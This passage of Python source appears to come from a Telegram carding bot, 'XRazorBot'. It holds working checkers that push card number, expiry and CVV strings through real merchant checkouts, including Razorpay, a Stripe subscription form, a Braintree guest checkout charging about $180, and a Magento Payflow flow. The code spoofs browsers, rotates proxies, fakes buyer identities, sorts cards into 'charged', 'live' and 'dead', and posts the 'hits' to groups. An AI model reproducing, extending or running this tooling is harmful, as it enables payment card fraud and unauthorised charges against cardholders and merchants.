        elif 'LIVE' in status_raw.upper() or 'CCN' in status_raw.upper():
            status = 'APPROVED'
        if status == '3DS_REQUIRED':
            msg = '3D Secure required'
        return {
            'status': status,
            'message': msg,
            'gateway': data.get('gateway', 'Razorpay'),
            'price': f'₹{RAZORPAY_AMOUNT}',
            'card': cc_str
        }
    except Exception as e:
        return {'status': 'ERROR', 'message': str(e), 'gateway': 'Razorpay', 'price': f'₹{RAZORPAY_AMOUNT}', 'card': cc_str}

# ================== STRIPE $5 CHECKER ==================
async def check_stripe5_card(cc_str: str, proxy: str = None):
    card = parse_cc(cc_str)
    if not card:
        return {'status': 'ERROR', 'message': 'Invalid format', 'gateway': 'Stripe $5', 'price': '$5', 'card': cc_str}
    user = ''.join(random.choices(string.ascii_lowercase, k=6)) + ''.join(random.choices(string.digits, k=4))
    data = {
        'user_name': user, 'user_pass': '@Nikhil789', 'user_pass2': '@Nikhil789', 'email': f'{user}@gmail.com',
        'first_name': 'nani', 'last_name': 'nikhil', 'company': 'nihkil', 'address': '3rd street avenue rd.',
        'city': 'new york', 'state': 'New York', 'zip': '10080', 'country': 'United States', 'phone': '2015554587',
        'ccnumber': card['number'], 'ccexpmonth': card['mm'], 'ccexpyear': card['yy'], 'cvs': card['cvc'],
        'form_build_id': 'form-560TzB2b4F2KzMqLTlRtth-QRkwn12nlBC2PzOcVEUE',
        'form_id': 'subscription_purchase_form', 'honeypot_time': '1775906069|7HvYXRiVjv1-TI6417wSonlnvZYWimMafMMXHXqYF5M', 'url': ''
    }
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://www.galaxie.com',
        'referer': 'https://www.galaxie.com/subscribe/2',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    proxy_url = None
    if proxy:
        if not proxy.startswith('http://') and not proxy.startswith('https://'):
            proxy_url = f"http://{proxy}"
        else:
            proxy_url = proxy
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(STRIPE5_URL, data=data, headers=headers, proxy=proxy_url, timeout=30, allow_redirects=True) as resp:
                text = await resp.text()
        text_lower = text.lower()
        if "thank you" in text_lower or "subscription confirmed" in text_lower or "welcome" in text_lower:
            return {'status': 'CHARGED', 'message': 'Subscription successful', 'gateway': 'Stripe $5', 'price': '$5', 'card': cc_str}
        elif "insufficient funds" in text_lower:
            return {'status': 'APPROVED', 'message': 'Insufficient funds (Live)', 'gateway': 'Stripe $5', 'price': '$5', 'card': cc_str}
        elif "cvv" in text_lower or "security code" in text_lower:
            return {'status': 'APPROVED', 'message': 'CVV mismatch (Live)', 'gateway': 'Stripe $5', 'price': '$5', 'card': cc_str}
        elif "declined" in text_lower:
            return {'status': 'DECLINED', 'message': 'Card declined', 'gateway': 'Stripe $5', 'price': '$5', 'card': cc_str}
        else:
            return {'status': 'DECLINED', 'message': 'Transaction failed', 'gateway': 'Stripe $5', 'price': '$5', 'card': cc_str}
    except Exception as e:
        return {'status': 'ERROR', 'message': str(e), 'gateway': 'Stripe $5', 'price': '$5', 'card': cc_str}

# ================== BRAINTREE CHECKER ==================
def braintree_charge_check_sync(card_raw, proxy_url=None):
    import base64, json, re, random, time, uuid
    import requests
    from curl_cffi import requests as cfrequests
    cc_full = card_raw.strip()
    try:
        parts = re.split(r'[:|/ ]', cc_full)
        if len(parts) < 4:
            return {"status": "error", "response": "Invalid format"}
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 2: yy = "20" + yy
        if len(mm) == 1: mm = "0" + mm
        proxy = None
        if proxy_url:
            proxy = {"http": proxy_url, "https": proxy_url}
        session = cfrequests.Session(impersonate="chrome")
        first_name = random.choice(["James", "Robert", "John", "Michael"])
        last_name = random.choice(["Smith", "Johnson", "Williams"])
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(100,999)}@gmail.com"
        r = session.get(BRAINTREE_SITE_URL, proxies=proxy, timeout=30)
        if r.status_code != 200:
            return {"status": "error", "response": f"Homepage {r.status_code}"}
        r = session.get(BRAINTREE_PRODUCT_URL, proxies=proxy, timeout=30)
        aspnet = {}
        for f in ['__VIEWSTATE','__VIEWSTATEGENERATOR','__EVENTVALIDATION']:
            v = re.search(rf'id="{f}" value="([^"]+)"', r.text)
            if v: aspnet[f] = v.group(1)
        options = re.findall(r'name="(ctl00[^"]*rblOptions[^"]*)"[^>]*value="([^"]*)"', r.text)
        for n, v in options: aspnet[n] = v
        aspnet['ctl00$ctl00$MainContent$Body$btnAddToCart'] = 'ADD TO CART'
        aspnet['ctl00$ctl00$MainContent$Body$txtQuantity'] = '1'
        r = session.post(BRAINTREE_PRODUCT_URL, data=aspnet, proxies=proxy, timeout=30)
        r = session.get(BRAINTREE_CHECKOUT_URL, proxies=proxy, timeout=30)
        aspnet = {}
        for f in ['__VIEWSTATE','__VIEWSTATEGENERATOR','__EVENTVALIDATION']:
            v = re.search(rf'id="{f}" value="([^"]+)"', r.text)
            if v: aspnet[f] = v.group(1)
        aspnet['ctl00$ctl00$ctl00$MainContent$Body$Body$btnContinue'] = 'Continue as Guest'
        r = session.post(r.url, data=aspnet, proxies=proxy, timeout=30)
        pfx = 'ctl00$ctl00$ctl00$MainContent$Body$Body$CheckoutAddresses1'
        aspnet = {}
        for f in ['__VIEWSTATE','__VIEWSTATEGENERATOR','__EVENTVALIDATION','__VIEWSTATEENCRYPTED']:
            v = re.search(rf'id="{f}" value="([^"]+)"', r.text)
            if v: aspnet[f] = v.group(1)
        aspnet[f'{pfx}$AECCreditCard$txtFirstName'] = first_name
        aspnet[f'{pfx}$AECCreditCard$txtLastName'] = last_name
        aspnet[f'{pfx}$AECCreditCard$txtAddress1'] = '456 Oak Ave'
        aspnet[f'{pfx}$AECCreditCard$txtCity'] = 'Houston'
        aspnet[f'{pfx}$AECCreditCard$txtStateProvince'] = 'TX'
        aspnet[f'{pfx}$AECCreditCard$txtPostalCode'] = '77001'
        aspnet[f'{pfx}$AECCreditCard$ddlCountry'] = '225'
        aspnet[f'{pfx}$AECCreditCard$txtSimplePhone'] = '7135551234'
        aspnet[f'{pfx}$rptShippingAddresses$ctl00$chkSameAsBilling'] = 'on'
        aspnet[f'{pfx}$rptShippingAddresses$ctl00$AECShipping$ddlCountry'] = '225'
        aspnet[f'{pfx}$btnCheckOut'] = 'Continue'
        r = session.post(r.url, data=aspnet, proxies=proxy, timeout=30)
        if 'pfas' in r.url.lower():
            aspnet = {}
            for f in ['__VIEWSTATE','__VIEWSTATEGENERATOR','__EVENTVALIDATION']:
                v = re.search(rf'id="{f}" value="([^"]+)"', r.text)
                if v: aspnet[f] = v.group(1)
            aspnet['ctl00$ctl00$ctl00$MainContent$Body$Body$btnProceedWithoutItems'] = 'Proceed'
            r = session.post(r.url, data=aspnet, proxies=proxy, timeout=30)
        if 'review' not in r.url.lower():
            r = session.get(f"{BRAINTREE_REVIEW_URL}?guestcheckout=1", proxies=proxy, timeout=30)
        page = r.text
        client_token_b64 = re.search(r'clientToken = "([^"]+)"', page)
        if not client_token_b64:
            client_token_b64 = re.search(r"clientToken = '([^']+)'", page)
        if not client_token_b64:
            return {"status": "error", "response": "No Braintree token"}
        client_token = client_token_b64.group(1)
        try:
            decoded = json.loads(base64.b64decode(client_token).decode())
            auth_fingerprint = decoded.get('authorizationFingerprint', '')
        except:
            auth_fingerprint = client_token if client_token.startswith('eyJ') else ''
        if not auth_fingerprint:
            return {"status": "error", "response": "Empty fingerprint"}
        session_id = str(uuid.uuid4())
        headers_bt = {
            'authorization': f'Bearer {auth_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0',
            'origin': 'https://assets.braintreegateway.com',
        }
        mutation = {
            "clientSdkMetadata": {"source": "client", "integration": "dropin2", "sessionId": session_id},
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 expirationMonth expirationYear binData { issuingBank countryOfIssuance } } } }",
            "variables": {
                "input": {
                    "creditCard": {"number": cc, "expirationMonth": mm, "expirationYear": yy, "cvv": cvv, "billingAddress": {"postalCode": "77001"}},
                    "options": {"validate": False}
                }
            },
            "operationName": "TokenizeCreditCard"
        }
        r_bt = requests.post(BRAINTREE_GRAPHQL, json=mutation, headers=headers_bt, proxies=proxy, timeout=30)
        bt_data = r_bt.json()
        if "errors" in bt_data:
            err = bt_data["errors"][0].get("message", "Tokenization error")
            return {"status": "dead", "response": err}
        nonce = bt_data.get("data", {}).get("tokenizeCreditCard", {}).get("token")
        if not nonce:
            return {"status": "error", "response": "Empty nonce"}
        rpfx = 'ctl00$ctl00$ctl00$MainContent$Body$Body$CheckoutReview1'
        aspnet = {}
        for f in ['__VIEWSTATE','__VIEWSTATEGENERATOR','__EVENTVALIDATION','__VIEWSTATEENCRYPTED']:
            v = re.search(rf'id="{f}" value="([^"]+)"', page)
            if v: aspnet[f] = v.group(1)
        device_data = json.dumps({"correlation_id": session_id[:26]})
        aspnet[f'{rpfx}$Braintree1$txtNonce'] = nonce
        aspnet[f'{rpfx}$Braintree1$txtDeviceData'] = device_data
        aspnet[f'{rpfx}$Braintree1$txtPaymentType'] = 'CreditCard'
        aspnet[f'{rpfx}$payment_type'] = 'Braintree'
        aspnet[f'{rpfx}$txtEmail'] = email
        aspnet[f'{rpfx}$btnSubmit'] = 'Place Order'
        r = session.post(f"{BRAINTREE_REVIEW_URL}?guestcheckout=1", data=aspnet, proxies=proxy, timeout=30)
        resp_text = r.text.lower()
        if "thank you" in resp_text or "order confirmation" in resp_text:
            return {"status": "charged", "response": "Charged ~$180 ✅", "amount": "~$180"}
        elif "insufficient" in resp_text:
            return {"status": "live", "response": "Insufficient Funds → Live ✅"}
        elif "cvv" in resp_text or "security code" in resp_text:
            return {"status": "live", "response": "CVV Mismatch → Live ✅"}
        elif "declined" in resp_text:
            return {"status": "dead", "response": "Declined ❌"}
        else:
            return {"status": "dead", "response": "Transaction failed"}
    except Exception as e:
        return {"status": "error", "response": str(e)}

async def check_braintree_card(cc_str: str, proxy: str = None):
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, braintree_charge_check_sync, cc_str, proxy)
    status_map = {"charged": "CHARGED", "live": "APPROVED", "dead": "DECLINED", "error": "ERROR"}
    result["status"] = status_map.get(result.get("status"), "DECLINED")
    result["gateway"] = "Braintree Charge"
    result["price"] = result.get("amount", "~$180")
    result["card"] = cc_str
    result["message"] = result.get("response", "Unknown response")
    return result


# ================== PAYFLOW CHECKER (UPDATED) ==================
async def check_payflow_card(cc_str: str, proxy: dict = None) -> dict:
    """
    Payflow $18 single check using the new script (Magento guest checkout).
    Supports proxy dict.
    """
    import re, random, time, requests
    from typing import Tuple, Optional

    # ---------- helper functions from the new script ----------
    def parse_response(result_code: str, resp_msg: str) -> Tuple[str, str]:
        text_lower = f"{result_code} - {resp_msg}".lower()
        if (result_code == "0" or "approved" in text_lower or "thank you" in text_lower or
            "payment successful" in text_lower or "transaction completed" in text_lower or
            "order confirmed" in text_lower or "charge" in text_lower):
            return "charged", f"✅ CHARGED | Code: {result_code} - {resp_msg}"
        if ("cvv2 mismatch" in text_lower or "cvv mismatch" in text_lower or
            "cvv2_faliure" in text_lower or "credit card verification number" in text_lower or
            ("cvv" in text_lower and ("invalid" in text_lower or "incorrect" in text_lower))):
            return "cvv", f"🔒 CVV2_FAILURE | Code: {result_code} - {resp_msg}"
        if ("funds" in text_lower or "insufficient" in text_lower or "insufficient_funds" in text_lower):
            return "live", f"💰 INSUFFICIENT_FUNDS | Code: {result_code} - {resp_msg}"
        return "declined", f"❌ DECLINED | Code: {result_code} - {resp_msg}"

    def create_guest_cart(session: requests.Session, base_url: str) -> Optional[str]:
        try:
            response = session.post(f'{base_url}/rest/default/V1/guest-carts',
                                    headers={'Content-Type': 'application/json'},
                                    verify=False, timeout=30)
            if response.status_code in [200, 201]:
                return response.text.strip('"')
            return None
        except Exception:
            return None

    def set_payment_info(session: requests.Session, base_url: str, cart_id: str, email: str,
                         cc_type: str, cc_last_4: str, cc_exp_month: str, cc_exp_year: str) -> bool:
        try:
            data = {
                "cartId": cart_id,
                "paymentMethod": {
                    "method": "payflowpro",
                    "additional_data": {"cc_type": cc_type, "cc_exp_year": cc_exp_year,
                                        "cc_exp_month": cc_exp_month, "cc_last_4": cc_last_4},
                    "extension_attributes": {"agreement_ids": ["1"]}
                },
                "email": email,
                "billingAddress": {
                    "countryId": "US", "regionId": "12", "region": "", "street": ["123 Main St", ""],
                    "company": "", "telephone": "5551234567", "postcode": "90210", "city": "Beverly Hills",
                    "firstname": "John", "lastname": "Doe", "vatId": "", "saveInAddressBook": None
                }
            }
            response = session.post(f'{base_url}/rest/default/V1/guest-carts/{cart_id}/set-payment-information',
                                    headers={'Content-Type': 'application/json'}, json=data, verify=False, timeout=30)
            return response.status_code in [200, 201]
        except Exception:
            return False

    def get_secure_token(session: requests.Session, base_url: str, form_key: str, cc_type: str) -> dict:
        try:
            data = {
                'form_key': form_key,
                'captcha_form_id': 'payment_processing_request',
                'payment[method]': 'payflowpro',
                'billing-address-same-as-shipping': 'on',
                'agreement[1]': '1',
                'recaptcha-validate': '',
                'controller': 'checkout_flow',
                'cc_type': cc_type,
            }
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': base_url,
                'referer': f'{base_url}/checkout/',
                'x-requested-with': 'XMLHttpRequest',
            }
            response = session.post(f'{base_url}/paypal/transparent/requestSecureToken/',
                                    headers=headers, data=data, verify=False, timeout=30)
            if response.status_code == 200:
                result = response.json()
                if result.get('success'):
                    fields = result.get('payflowpro', {}).get('fields', {})
                    return {'securetoken': fields.get('securetoken'), 'securetokenid': fields.get('securetokenid'), 'success': True}
            return {'success': False}
        except Exception:
            return {'success': False}

    def get_form_key(session: requests.Session, base_url: str) -> str:
        try:
            response = session.get(f'{base_url}/checkout/', verify=False, timeout=30)
            match = re.search(r'name="form_key" value="([^"]+)"', response.text)
            if match:
                return match.group(1)
            match = re.search(r'"formKey":"([^"]+)"', response.text)
            if match:
                return match.group(1)
        except Exception:
            pass
        return '6Ks5syraLFbK7lyN'

    def detect_card_type(cc_number: str) -> str:
        if cc_number.startswith('4'): return 'VI'
        elif cc_number.startswith(('51', '52', '53', '54', '55')): return 'MC'
        elif cc_number.startswith(('34', '37')): return 'AE'
        elif cc_number.startswith('6011'): return 'DI'
        else: return 'VI'

    def process_single_card(card_string: str, session: requests.Session, base_url: str = PAYFLOW_BASE_URL) -> Tuple[str, str]:
        match = re.match(r'^(\d+)\|(\d{2})\|(\d{2,4})\|(\d{3,4})$', card_string.strip())
        if not match:
            return "error", f"Invalid format: {card_string}"
        cc_number, cc_month, cc_year, cc_cvv = match.groups()
        if len(cc_year) == 4:
            cc_year_full = cc_year
            cc_year = cc_year[-2:]
        else:
            cc_year_full = '20' + cc_year
        try:
            cart_id = create_guest_cart(session, base_url)
            if not cart_id:
                return "error", "Failed to create cart"
            form_key = get_form_key(session, base_url)
            cc_type = detect_card_type(cc_number)
            cc_last_4 = cc_number[-4:]
            email = f"user{random.randint(1000, 9999)}@gmail.com"
            set_payment_info(session, base_url, cart_id, email, cc_type, cc_last_4, cc_month, cc_year_full)
            token_data = get_secure_token(session, base_url, form_key, cc_type)
            if not token_data.get('success'):
                return "error", "Failed to get secure token"
            expdate = cc_month + cc_year
            paypal_data = {
                'result': '0',
                'securetoken': token_data['securetoken'],
                'securetokenid': token_data['securetokenid'],
                'respmsg': 'Approved',
                'result_code': '0',
                'csc': cc_cvv,
                'expdate': expdate,
                'acct': cc_number,
            }
            paypal_headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': base_url,
                'referer': f'{base_url}/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }
            response = session.post('https://payflowlink.paypal.com/', headers=paypal_headers, data=paypal_data, verify=False, timeout=30)
            result_code_match = re.search(r'name="RESULT" value="(.*?)"', response.text)
            respmsg_match = re.search(r'name="RESPMSG" value="(.*?)"', response.text)
            result_code = result_code_match.group(1) if result_code_match else 'N/A'
            resp_msg = respmsg_match.group(1) if respmsg_match else response.text[:200]
            status, message = parse_response(result_code, resp_msg)
            return status, message
        except Exception as e:
            return "error", str(e)[:100]

    def check_card(card_string: str, proxy_dict: dict = None) -> Tuple[str, str]:
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
        })
        if proxy_dict:
            session.proxies.update(proxy_dict)
        return process_single_card(card_string, session)

    # ---------- Async wrapper ----------
    card = parse_cc(cc_str)
    if not card:
        return {'status': 'ERROR', 'message': 'Invalid format', 'gateway': 'Payflow $18', 'price': '$18', 'card': cc_str}
    proxy_dict = None
    if proxy and isinstance(proxy, dict):
        proxy_dict = proxy  # already in requests format
    loop = asyncio.get_event_loop()
    status, message = await loop.run_in_executor(None, check_card, f"{card['number']}|{card['mm']}|{card['yy']}|{card['cvc']}", proxy_dict)
    # Map status to bot's expected format
    status_map = {
        "charged": "CHARGED",
        "cvv": "APPROVED",
        "live": "APPROVED",
        "declined": "DECLINED",
        "error": "ERROR"
    }
    final_status = status_map.get(status, "DECLINED")
    return {
        'status': final_status,
        'message': message,
        'gateway': 'Payflow $18',
        'price': '$18',
        'card': cc_str
    }

# ================== UI HELPERS ==================
def _build_result_msg(gateway_label, result, elapsed, username, plan_badge, brand, bin_type, level, bank, country, flag):
    card = result.get('card', '')
    gw   = result.get('gateway', gateway_label)
    raw_status = result.get('status', '')
    response = result.get('message', '')[:120]
    if raw_status in ('CHARGED', 'Charged'):
        status_text = 'Charged 💎'
    elif raw_status in ('APPROVED', 'Approved'):
        status_text = 'Approved ✅'
    elif raw_status in ('LIVE', 'Live'):
        status_text = 'Live 🔥'
    elif raw_status == '3DS_REQUIRED':
        status_text = '3DS Required 🔐'
    elif raw_status in ('DECLINED', 'Declined'):
        status_text = 'Declined ❌'
    else:
        status_text = 'Dead ❌'
    display = username if username else "Unknown"
    return (
        f"<b>[#{gateway_label}] | ~XRazorBot ✦</b>\n"
        f"<b>━━━━━━━━━━━━━━━</b>\n"
        f"<b>[•] Card-</b> <code>{card}</code>\n"
        f"<b>[•] Gateway -</b> {gw}\n"
        f"<b>[•] Status-</b> {status_text}\n"
        f"<b>[•] Response-</b> {response}\n"
        f"<b>━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━</b>\n"
        f"<b>[+] Bin Info:</b> {brand} - {bin_type} - {level}\n"
        f"<b>[+] Bank:</b> {bank}\n"
        f"<b>[+] Country:</b> {country} {flag}\n"
        f"<b>━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━</b>\n"
        f"<b>[ﾒ] Checked By:</b> {display} <b>[{plan_badge}]</b>\n"
        f"<b>━━━━━━━━━━━━━━━</b>\n"
        f"<b>[ﾒ] T/t:</b> <b>[{elapsed:.2f} 𝐬]</b>"
    )

async def send_realtime_hit(user_id, result, hit_type, username, group_id=None, reply_to=None):
    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    elapsed = result.get('elapsed', 0.0)
    plan_badge = get_plan_badge(user_id)
    try:
        sender = await bot.get_entity(user_id)
        display_name = sender.first_name or username or "User"
    except:
        display_name = username or "User"
    message = premium_emoji(_build_result_msg('Shopify', result, elapsed, display_name, plan_badge, brand, bin_type, level, bank, country, flag))

    # 1) Send to user (private chat) and pin if Charged
    try:
        sent = await bot.send_message(user_id, message, parse_mode='html')
        if hit_type == "Charged":
            await pin_charged_message(user_id, sent.id)
    except:
        pass

    # 2) Send to group if provided (mass check group) and pin if Charged
    if group_id and group_id != user_id:
        try:
            sent = await bot.send_message(group_id, message, parse_mode='html', reply_to=reply_to)
            if hit_type == "Charged":
                await pin_charged_message(group_id, sent.id)
        except:
            try:
                sent = await bot.send_message(group_id, message, parse_mode='html')
                if hit_type == "Charged":
                    await pin_charged_message(group_id, sent.id)
            except:
                pass

        

async def update_progress(chat_id, message_id, results, current_attempt_count, gateway_type=None):
    gateway    = results.get('last_gateway', 'Unknown')
    command    = results.get('command', 'Mass').lstrip('/')
    total      = results['total']
    checked    = current_attempt_count
    charged    = len(results.get('charged', []))
    approved   = len(results.get('approved', []))
    declined   = len(results.get('dead', []))
    last       = results.get('last_card')
    cc_disp    = (last['card'][:28] if last else 'Waiting...') if last else 'Waiting...'
    resp_disp  = (last['message'][:28] if last else '-') if last else '-'

    msg = (
        f"✦ ${command} | ~ XRazorBot ✦\n"
        f"[⚬] Gateway: {gateway}\n"
        f"[⚬] Cards: {total}\n"
        f"[⚬] Status: Checking..."
    )

    if gateway_type == 'stripe':
        buttons = [
            [Button.inline(f"CC ↬ {cc_disp}", b"mass_noop")],
            [Button.inline(f"Response ↬ {resp_disp}", b"mass_noop")],
            [Button.inline(f"Approved ↬ [{approved}] ✅", b"mass_noop"), Button.inline(f"Declined ↬ [{declined}] ❌", b"mass_noop")],
            [Button.inline(f"Progress ↬ [{checked}/{total}] ⏳", b"mass_noop")],
            [Button.inline("⚠️ Stop", b"stop")],
        ]
    else:
        buttons = [
            [Button.inline(f"CC ↬ {cc_disp}", b"mass_noop")],
            [Button.inline(f"Response ↬ {resp_disp}", b"mass_noop")],
            [Button.inline(f"Charged ↬ [{charged}] 💎", b"mass_noop"),  Button.inline(f"Approved ↬ [{approved}] ✅", b"mass_noop")],
            [Button.inline(f"Declined ↬ [{declined}] ❌", b"mass_noop"), Button.inline(f"Progress ↬ [{checked}/{total}] ⏳", b"mass_noop")],
            [Button.inline("⚠️ Stop", b"stop")],
        ]
    try:
        await bot.edit_message(chat_id, message_id, premium_emoji(msg), buttons=buttons, parse_mode='html')
    except:
        pass

async def send_final_results(user_id, results, gateway_name):
    elapsed = int(time.time() - results['start_time'])
    hours, minutes, seconds = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
    hits_text = ""
    for r in results.get('charged', [])[:5]:
        hits_text += f"✅ <code>{r['card']}</code>\n"
    for r in results.get('approved', [])[:5]:
        hits_text += f"🔥 <code>{r['card']}</code>\n"
    if not hits_text:
        hits_text = "No hits found"
    gateway = (results.get('charged') and results['charged'][0].get('gateway')) or (results.get('approved') and results['approved'][0].get('gateway')) or results.get('last_gateway', 'Unknown')
    summary = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results.get('charged', []))} | 🔥 Live: {len(results.get('approved', []))} | ❌ Dead: {len(results.get('dead', []))}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐇𝐢𝐭𝐬</b>
<blockquote>{hits_text}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
🤖 <b>Bot By: {BOT_NAME_STYLED}</b>"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{gateway_name}_{user_id}_{timestamp}.txt"
    async with aiofiles.open(filename, 'w') as f:
        await f.write("=" * 70 + f"\n⚡💳 {gateway_name.upper()} RESULTS 💳⚡\n\n")
        await f.write(f"✅ CHARGED ({len(results.get('charged', []))}):\n")
        for r in results.get('charged', []):
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
        await f.write(f"\n🔥 APPROVED ({len(results.get('approved', []))}):\n")
        for r in results.get('approved', []):
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
        await f.write(f"\n❌ DEAD ({len(results.get('dead', []))}):\n")
        for r in results.get('dead', []):
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
    await bot.send_message(user_id, premium_emoji(summary), file=filename, parse_mode='html')
    try:
        os.remove(filename)
    except:
        pass

async def send_stripe5_final_results(user_id, results):
    """Final results for Stripe $5 mass check"""
    elapsed = int(time.time() - results['start_time'])
    hours, minutes, seconds = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
    hits_text = ""
    for r in results.get('charged', [])[:5]:
        hits_text += f"✅ <code>{r['card']}</code>\n"
    for r in results.get('approved', [])[:5]:
        hits_text += f"🔥 <code>{r['card']}</code>\n"
    if not hits_text:
        hits_text = "No hits found"
    summary = f"""<b>⚡💳 ㅤ#𝒮𝓉𝓇𝒾𝓅𝑒$5  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results.get('charged', []))} | 🔥 Live: {len(results.get('approved', []))} | ❌ Dead: {len(results.get('dead', []))}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 Stripe $5</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐇𝐢𝐭𝐬</b>
<blockquote>{hits_text}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
🤖 <b>Bot By: {BOT_NAME_STYLED}</b>"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"stripe5_{user_id}_{timestamp}.txt"
    async with aiofiles.open(filename, 'w') as f:
        await f.write("=" * 70 + "\n⚡💳 STRIPE $5 RESULTS 💳⚡\n\n")
        await f.write(f"✅ CHARGED ({len(results.get('charged', []))}):\n")
        for r in results.get('charged', []):
            await f.write(f"{r['card']} | {r.get('gateway', 'Stripe $5')} | {r.get('price', '$5')} | {r['message'][:100]}\n")
        await f.write(f"\n🔥 LIVE ({len(results.get('approved', []))}):\n")
        for r in results.get('approved', []):
            await f.write(f"{r['card']} | {r.get('gateway', 'Stripe $5')} | {r.get('price', '$5')} | {r['message'][:100]}\n")
        await f.write(f"\n❌ DEAD ({len(results.get('dead', []))}):\n")
        for r in results.get('dead', []):
            await f.write(f"{r['card']} | {r.get('gateway', 'Stripe $5')} | {r.get('price', '$5')} | {r['message'][:100]}\n")
    await bot.send_message(user_id, premium_emoji(summary), file=filename, parse_mode='html')
    try:
        os.remove(filename)
    except:
        pass

async def send_stripe_auth_final_results(user_id, results):
    elapsed = int(time.time() - results['start_time'])
    hours, minutes, seconds = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
    hits_text = ""
    for r in results.get('approved', [])[:5]:
        hits_text += f"🔥 <code>{r['card']}</code>\n"
    if not hits_text:
        hits_text = "No approved cards"
    summary = f"""<b>⚡💳 ㅤ#𝒮𝓉𝓇𝒾𝓅𝑒𝒜𝓊𝓉𝒽  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>💳 Total: {results['total']} | 🔥 Approved: {len(results.get('approved', []))} | ❌ Declined: {len(results.get('dead', []))}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 Stripe Auth</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐇𝐢𝐭𝐬</b>
<blockquote>{hits_text}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
🤖 <b>Bot By: {BOT_NAME_STYLED}</b>"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"stripe_auth_{user_id}_{timestamp}.txt"
    async with aiofiles.open(filename, 'w') as f:
        await f.write("=" * 70 + "\n⚡💳 STRIPE AUTH RESULTS 💳⚡\n\n")
        await f.write(f"🔥 APPROVED ({len(results.get('approved', []))}):\n")
        for r in results.get('approved', []):
            await f.write(f"{r['card']} | {r.get('gateway', 'Stripe Auth')} | {r['message'][:100]}\n")
        await f.write(f"\n❌ DECLINED ({len(results.get('dead', []))}):\n")
        for r in results.get('dead', []):
            await f.write(f"{r['card']} | {r.get('gateway', 'Stripe Auth')} | {r['message'][:100]}\n")
    await bot.send_message(user_id, premium_emoji(summary), file=filename, parse_mode='html')
    try:
        os.remove(filename)
    except:
        pass

async def broadcast_charged_hit(result, user_info):
    groups = load_approved_groups()
    if not groups:
        return
    username = user_info.get('username', 'Unknown')
    first_name = user_info.get('first_name', 'User')

    plan_badge = get_plan_badge(user_info['id'])
    msg = f"""🧿 <b>𝑯𝒊𝒕 𝑫𝒆𝒕𝒆𝒄𝒕𝒆𝒅</b> ↬ Charged 💎
⚡ <b>𝐆𝚊𝐭𝐞𝐰𝚊𝐲</b> ↬ {result.get('gateway', 'Unknown')}
📝 <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ {result['message'][:100]}
